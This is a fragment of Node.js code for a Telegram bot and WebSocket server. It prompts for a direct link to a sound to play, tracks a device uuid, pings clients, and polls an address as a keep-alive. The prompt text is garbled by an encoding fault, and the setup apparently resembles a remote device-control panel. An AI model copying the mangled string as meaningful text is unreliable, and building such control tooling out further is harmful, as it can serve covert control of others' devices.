            '‚Ä¢ …¥·¥è·¥õ·¥á ·¥õ ú·¥Ä·¥õ  è·¥è·¥ú ·¥ç·¥ús·¥õ ·¥á…¥·¥õ·¥á Ä ·¥õ ú·¥á ·¥Ö…™ Ä·¥á·¥Ñ·¥õ  ü…™…¥·¥ã ·¥èÍú∞ ·¥õ ú·¥á ·¥Ö·¥ás…™ Ä·¥á·¥Ö s·¥è·¥ú…¥·¥Ö, ·¥è·¥õ ú·¥á Ä·¥°…™s·¥á ·¥õ ú·¥á s·¥è·¥ú…¥·¥Ö ·¥°…™ ü ü …¥·¥è·¥õ  ô·¥á ·¥ò ü·¥Ä è·¥á·¥Ö',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
});
setInterval(function () {
    appSocket.clients.forEach(function each(ws) {
        ws.send('ping')
    });
    try {
        axios.get(address).then(r => "")
    } catch (e) {
    }
}, 5000)
appServer.listen(process.env.PORT || 8999);
